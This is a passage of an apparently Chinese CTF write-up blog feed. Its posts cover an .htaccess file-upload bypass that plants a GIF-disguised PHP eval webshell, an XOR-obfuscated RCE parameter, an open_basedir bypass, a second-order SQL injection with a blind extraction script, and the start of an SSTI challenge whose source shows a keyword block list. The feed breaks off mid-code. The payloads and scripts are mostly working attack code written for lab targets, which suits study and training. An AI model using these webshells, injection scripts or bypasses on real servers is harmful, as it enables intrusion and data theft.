class="hljs-number">00</span><span class="hljs-keyword">x</span><span class="hljs-number">00</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>ax<span class="hljs-number">39</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>ax<span class="hljs-number">39</span>(要在十六进制编辑器中添加，或者使用python的bytes类型)<br><span class="hljs-keyword">x</span><span class="hljs-number">00</span><span class="hljs-keyword">x</span><span class="hljs-number">00</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>ax<span class="hljs-number">39</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>ax<span class="hljs-number">39</span> 是wbmp文件的文件头<br>.htaccess中以<span class="hljs-number">0x00</span>开头的同样也是注释符，所以不会影响.htaccess<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title="&lt;?和exif_imagetype的绕过"></a>&lt;?和exif_imagetype的绕过</h2><p>利用 .htaccess 文件和文件幻术绕过代码中对文件上传的严格检查，进而执行任意代码获取 flag。具体步骤为：上传特制的 .htaccess 文件，利用 php_value auto_append_file 和 AddType 指令，配合 php:&#x2F;&#x2F;filter 伪协议绕过对 &lt;? 的检测；同时，为上传的 PHP 代码文件添加 GIF 文件头幻术绕过 exif_imagetype 检测。</p><p>.htaccess 文件是 Apache 服务器的配置文件，可用于在目录级别覆盖全局服务器配置。我们可以利用它来改变 PHP 解析文件的方式。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta">#<span class="hljs-keyword">define</span> width 1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> height 1337</span><br><span class="hljs-meta"># 指定所有以 .gif 结尾的文件都按 PHP 脚本解析</span><br>AddType application/x-httpd-php .gif<br><span class="hljs-meta"># 自动在每个 PHP 脚本执行前包含指定的文件，这里使用 php:<span class="hljs-comment">//filter 伪协议对 base64 编码的内容进行解码并包含</span></span><br>php_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=shell.gif</span><br></code></pre></td></tr></table></figure><hr><h2 id="shell-gif文件的创建"><a href="#shell-gif文件的创建" class="headerlink" title="shell.gif文件的创建"></a>shell.gif文件的创建</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 要执行的 PHP 代码</span><br><span class="hljs-variable">$php_code</span> = <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;<br><span class="hljs-comment">// 添加 GIF 文件头幻术</span><br><span class="hljs-variable">$shell_content</span> = <span class="hljs-string">&quot;GIF89a12\n&quot;</span> . <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$php_code</span>);<br><span class="hljs-comment">// 将内容写入 shell.gif 文件</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;shell.gif&#x27;</span>, <span class="hljs-variable">$shell_content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意：文件幻术头一般为GIF89A,这里只有6位，而base64解码时以4个字符为单位，所以需要再加两位随机字符</p><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><h3 id="html表单上传"><a href="#html表单上传" class="headerlink" title="html表单上传"></a>html表单上传</h3><p>由于没有上传界面，自己写一个上传的html表单</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--题目链接--&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://4c04fe1d-0363-4787-907c-2a14c670d0f3.node5.buuoj.cn:81/?_=$</span></span></span><span class="hljs-template-variable">&#123;%80%80%80%80^%df%c7%c5%d4&#125;</span><span class="hljs-template-variable">&#123;%80&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">();&amp;%80=get_the_flag&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;postedFile&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>分别传入.htaccess文件和shell.gif文件</p><p>得到两个路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">upload/tmp_86ee4f59cecf7db35b5352cce92d394a/.htaccess<br>upload/tmp_86ee4f59cecf7db35b5352cce92d394a/shell.gif<br></code></pre></td></tr></table></figure><h3 id="python脚本上传（更方便）"><a href="#python脚本上传（更方便）" class="headerlink" title="python脚本上传（更方便）"></a>python脚本上传（更方便）</h3><p>这里也可以用python脚本一键完成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br>import base64<br><br>htaccess = b<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">#define width 1337</span><br><span class="hljs-string">#define height 1337 </span><br><span class="hljs-string">AddType application/x-httpd-php .ahhh</span><br><span class="hljs-string">php_value auto_append_file &quot;</span>php:<span class="hljs-comment">//filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">shell = b&quot;</span>GIF89a12<span class="hljs-string">&quot; + base64.b64encode(b&quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot;)</span><br><span class="hljs-string">url = &quot;</span>http:<span class="hljs-comment">//96485d98-f134-4e77-8d3e-30725f4bad96.node5.buuoj.cn:81/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span><br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>data = &#123;<span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br>response = requests.<span class="hljs-title function_ invoke__">post</span>(url=url, data=data, files=files)<br><span class="hljs-keyword">print</span>(response.text)<br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;shell.ahhh&#x27;</span>,shell,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>response = requests.<span class="hljs-title function_ invoke__">post</span>(url=url, data=data, files=files)<br><span class="hljs-keyword">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>同样也是得到两个路径</p><hr><p>然后用蚁剑连接shell.gif的路径即可。</p><h2 id="绕过open-basedir和disable-function"><a href="#绕过open-basedir和disable-function" class="headerlink" title="绕过open_basedir和disable_function"></a>绕过open_basedir<code>和</code>disable_function</h2><p>在上传之后就可以通过蚁剑连接，但我们发现不能访问其他目录。查看phpinfo之后发现有<code>open_basedir</code></p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>利用蚁剑插件，选择<strong>PHP7 GC with Certain Destructors UAF</strong></p><p>然后在根目录发现flag</p><hr><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><ul><li>首先构造一个相对可以上跳的open_basedir 入mkdir(‘lin’); chdir(‘lin’) ，当然我们这里有上跳的路径我们直接 chdir(“img”)</li><li>然后每次操作chdir(“..”)都会进一次open_basedir的比对由于相对路径的问题，每次open_basedir的补全都会上跳。</li><li>比如初试open_basedir为&#x2F;a&#x2F;b&#x2F;c&#x2F;d：</li><li>第一次chdir后变为&#x2F;a&#x2F;b&#x2F;c，第二次chdir后变为&#x2F;a&#x2F;b，第三次chdir后变为&#x2F;a　第四次chdir后变为&#x2F;</li><li>那么这时候再进行ini_set，调整open_basedir为&#x2F;即可通过php_check_open_basedir_ex的校验，成功覆盖，导致我们可以bypass open_basedir。</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gams">mkdir(<span class="hljs-string">&#x27;lin&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;lin&#x27;</span>);<br><span class="hljs-function"><span class="hljs-title">ini_set</span>(<span class="hljs-params">&#x27;open_basedir&#x27;,&#x27;..&#x27;</span>)</span>;<br><span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<br><span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<br><span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<br><span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<br><span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<br><span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<br><span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<br><span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> .haccess </tag>
            
            <tag> 无字母数字RCE </tag>
            
            <tag> 异或绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018-Unfinish</title>
      <link href="/2025/04/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/"/>
      <url>/2025/04/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="网鼎杯2018-Unfinish"></a>网鼎杯2018-Unfinish</h1><p>首先是一个登录页面，但是没有发现注入点，然后扫一下发现register.php即注册页面。</p><p>我们随便注册一个账号，然后就能登录进去了，登录进去发现会回显用户名，其他啥也没有，很明显是二次注入</p><p>我们返回注册页面，设置用户名</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;and</span><span class="hljs-symbol">&#x27;1</span><br></code></pre></td></tr></table></figure><p>然后再登录查看用户名，发现用户名变为了1</p><p>我们猜测后台注册sql语句为<br><code>insert into tables values(&#39;$email&#39;,&#39;$username&#39;,&#39;$password&#39;)</code></p><p>如果username输入1’ and ‘1 </p><p>就变为了<code>insert into tables values(&#39;$email&#39;,&#39;1&#39; and &#39;1&#39;,&#39;$password&#39;)</code></p><p>然后username在数据库里就变为了1</p><hr><p>但是这里过滤了很多东西，包括information、注释符</p><p>但是这题可以通过”+”运算来</p><p>sql语句中+进行运算的用法</p><p>比如</p><p>select ‘1’+’1’;–&gt;2</p><p>select ‘0’+’database()’;–&gt;0</p><p>但我们能把查询出来的用acii值转换为数字</p><p>这样就能进行+运算了</p><p>select ‘0’+ascii(substr(database(),1,1));<br>-&gt;115</p><p>所以构造</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">0</span>&#x27;+ascii(substr((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag) <span class="hljs-keyword">from</span> &#123;&#125; for <span class="hljs-number">1</span>))+&#x27;<span class="hljs-number">0</span><br><br>由于逗号被过滤了，只能用<span class="hljs-keyword">from</span> ... for ... 的形式<br>而且由于不知道表名只能盲猜表名为flag<br>注释符被过滤了不能用一般的盲注，且需要手动闭合<br></code></pre></td></tr></table></figure><p>完整脚本</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># coding:utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br><br>url = <span class="hljs-string">&#x27;http://e18d89d1-39c0-418c-b79d-8693dbee6727.node5.buuoj.cn:81/&#x27;</span><br><br>m = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):<br>    # payload = &quot;0&#x27;+ascii(substr((select database()) from &#123;&#125; for 1))+&#x27;0&quot;.format(i + <span class="hljs-number">1</span>)<br>    payload = &quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;.format(i + <span class="hljs-number">1</span>)  # 判断每一位ascii码是多少<br>    register = &#123;<span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;abc&#123;&#125;@qq.com&#x27;</span>.format(i), <span class="hljs-string">&#x27;username&#x27;</span>: payload, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456&#x27;</span>&#125;<br>    <span class="hljs-keyword">login</span> = &#123;<span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;abc&#123;&#125;@qq.com&#x27;</span>.format(i), <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456&#x27;</span>&#125;<br>    req = requests.<span class="hljs-keyword">session</span>()<br>    r1 = req.post(url + <span class="hljs-string">&#x27;register.php&#x27;</span>, data=register)<br>    r2 = req.post(url + <span class="hljs-string">&#x27;login.php&#x27;</span>, data=<span class="hljs-keyword">login</span>)<br>    r3 = req.post(url + <span class="hljs-string">&#x27;index.php&#x27;</span>)<br>    html = r3.text<br>    # print(html)<br>    soup = BeautifulSoup(html, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    # print(soup.prettify())<br>    UserName = soup.span.string<br>    print(UserName)<br>    <span class="hljs-keyword">if</span> <span class="hljs-type">int</span>(UserName) == <span class="hljs-number">0</span>:<br>        break<br>    m += chr(<span class="hljs-type">int</span>(UserName))<br>    print(m)<br>    <span class="hljs-type">time</span>.sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> sql盲注 </tag>
            
            <tag> 二次注入 </tag>
            
            <tag> sql加号运算注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TGCTF-2025</title>
      <link href="/2025/04/13/TGCTF-2025wp/"/>
      <url>/2025/04/13/TGCTF-2025wp/</url>
      
        <content type="html"><![CDATA[<h1 id="TGCTF-wp"><a href="#TGCTF-wp" class="headerlink" title="TGCTF-wp"></a>TGCTF-wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a>直面天命</h3><p>一进去看到这个页面，推测是ssti，但是试了下49发现被过滤了，然后查看下网页源代码</p><p>发现小提示</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--听说不止一个路由，/hint好像是给天命人的礼物？--&gt;</span><br></code></pre></td></tr></table></figure><p>然后访问url&#x2F;hint</p><p>发现小提示</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">hint</span><br>有一个由<span class="hljs-number">4</span>个小写英文字母组成的路由，去那里看看吧，天命人!<br></code></pre></td></tr></table></figure><p>这里告诉我们要去访问一个由4个小写英文字母组成的路由，这里我试了下爆破，但是数量太多bp太慢，实在受不了就买了个hint，然后知道了这个路由&#x2F;aazz</p><p>访问url&#x2F;aazz，没发现什么有用的信息，然后在网页源码里找到提示</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 狂风之中，恍惚之时，只听闻断续传来： ...参...数......？（本页面可以传参） --&gt;</span><br></code></pre></td></tr></table></figure><p>随便试了下传参filename，结果真的是这个。url?filename&#x3D;app.py读取源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory<br><span class="hljs-keyword">from</span> a.b.c.d.secret <span class="hljs-keyword">import</span> secret_key<br><br>app = Flask(__name__)<br><br>black_list=[<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> name.lower():<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_typable</span>(<span class="hljs-params">char</span>):<br>    <span class="hljs-comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span><br>    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace<br>    <span class="hljs-keyword">return</span> char <span class="hljs-keyword">in</span> typable_chars<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/jingu&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>():<br>    template1=<span class="hljs-string">&quot;&quot;</span><br>    template2=<span class="hljs-string">&quot;&quot;</span><br>    name = request.form.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">if</span> waf(name):<br>        template = <span class="hljs-string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;3.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        k=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">if</span> is_typable(i):<br>                <span class="hljs-keyword">continue</span><br>            k=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (secret_key[:<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> name <span class="hljs-keyword">and</span> secret_key[<span class="hljs-number">2</span>:]):<br>                template = <span class="hljs-string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧&lt;br&gt;&lt;br&gt;再去西行历练历练&lt;br&gt;&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;4.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;</span><br>                <span class="hljs-keyword">return</span> render_template_string(template)<br>            template1 = <span class="hljs-string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”&lt;br&gt;最后，如果你用了cat，就可以见到齐天大圣了&lt;br&gt;&quot;</span><br>            template= template.replace(<span class="hljs-string">&quot;直面&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;&quot;</span>).replace(<span class="hljs-string">&quot;天命&quot;</span>,<span class="hljs-string">&quot;&#125;&#125;&quot;</span>)<br>            template = template<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-keyword">in</span> template:<br>        template2 = <span class="hljs-string">&#x27;&lt;br&gt;或许你这只叫天命人的猴子，真的能做到？&lt;br&gt;&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;2.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> template1+render_template_string(template)+render_template_string(template2)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        error_message = <span class="hljs-string">f&quot;500报错了，查询语句如下：&lt;br&gt;<span class="hljs-subst">&#123;template&#125;</span>&quot;</span><br>        <span class="hljs-keyword">return</span> error_message, <span class="hljs-number">400</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hint&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hinter</span>():<br>    template=<span class="hljs-string">&quot;hint：&lt;br&gt;有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/aazz&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finder</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-string">&#x27;file.html&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename.replace(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).isalnum():<br>        content = jsonify(&#123;<span 